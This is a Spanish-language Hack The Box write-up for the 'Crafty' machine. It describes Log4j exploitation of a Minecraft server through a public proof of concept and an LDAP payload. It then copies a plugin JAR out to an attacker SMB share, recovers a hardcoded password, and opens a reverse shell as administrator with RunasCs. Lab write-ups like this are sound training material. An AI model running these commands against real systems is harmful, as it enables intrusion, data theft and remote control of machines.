___
# Máquina Crafty (Hack The Box)

**IP atacante**: 10.10.17.214 
**IP víctima**: 10.129.230.193

Comprobamos si tenemos conexión con la máquina:

![[crafty_ping.png]]

TTL = 127 -> Máquina Windows

___
# 1. Renocimiento

Realizamos un nmap para descubrir posibles puertos abiertos

![[crafty_nmap.png]]

Puertos abiertos:

- 80 | HTTP | Versión: Microsoft IIS httpd
- 25565 | Minecraft | Versión 1.16.5
# 2. Enumeración

Utilizamos una consola de minecraft en linux para conectarnos al servidor y poder ejecutar comandos desde esta.

https://github.com/MCCTeam/Minecraft-Console-Client

```bash
git clone https://github.com/MCCTeam/Minecraft-Console-Client
chmod +x <file>
./<file>
```

![[craft_consolemc.png]]

# 3. Explotación

Buscamos una vulnerabilidad para Log4j -> https://github.com/kozmer/log4j-shell-poc

¿Qué es Log4j?

- Es una biblioteca de software de código abierto muy popular desarrollada en lenguaje Java.
- Los desarrolladores la usan para registrar (hacer un _log_ de) eventos, errores y actividades de diagnóstico en sus programas.

Para usar el `poc.py`, necesitamos del archivo jdk1.8.0_20, asi que lo descomprimos y cambiamos el nombre

![[crafty_poc.png]]

Cambiamos el contenido del script para que nos envíe un cmd.exe en vez de una bash ya que la máquina es Windows

![[crafty_pocchange.png]]

Lo ejecutamos especificando la ip, el webport y el lport

![[crafty_pocflags.png]]

Nos mostrará un payload y nos pone que los mandemos a ``ldap://10.10.17.214:1389/a``
Copiamos y pegamos en la consola de minecraft y vemos que hemos ganado acceso a la máquina.

![[crafty_ncacces.png]]

Vamos al directorio del usuario y miramos la flag

![[crafty_flaguser.png]]

# 4. Escalada de privilegios

En la carpeta de plugins vemos un SNAPSHOT.jar, asi que lo mandamos a nuestra máquina para examinar y ver si encontramos credenciales en el código.

![[crafty_snapshot.png]]

Usamos un directorio compartido a nivel de red

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username alan -password alan123
```

Máquina víctima:

```cmd
net use \\10.10.17.214\smbFolder /u:alan alan123
copy playercounter-1.0-SNAPSHOT.jar \\10.10.17.214\smbFolder\playercounter.jar
```

Y así obtenemos el recurso compartido.

![[crafty_smbfile.png]]

Abrimos el archivo con jd-gui y podemos observar una contraseña: s67u84zKq8IXw

![[crafty_pass.png]]

Para ejecutar comandos como un usuario del sistema en Windows, utilizaremos la herramienta RunasCs

1. Nos descargamos el .zip
2. Montamos un servidor con **python3**3
3. En la víctima Windows, usamos certutil para obtener el archivo del servidor python.

![[crafty_certuil.png]]

Ejecutamos la herramienta:

```cmd
RunasSc.exe administrador s67u84zKq8IXw cmd.exe -r 10.10.17.214:443
```

Y obtenemos acceso como administrador: 5eed3dc2c37e9ef6799b6299e975179f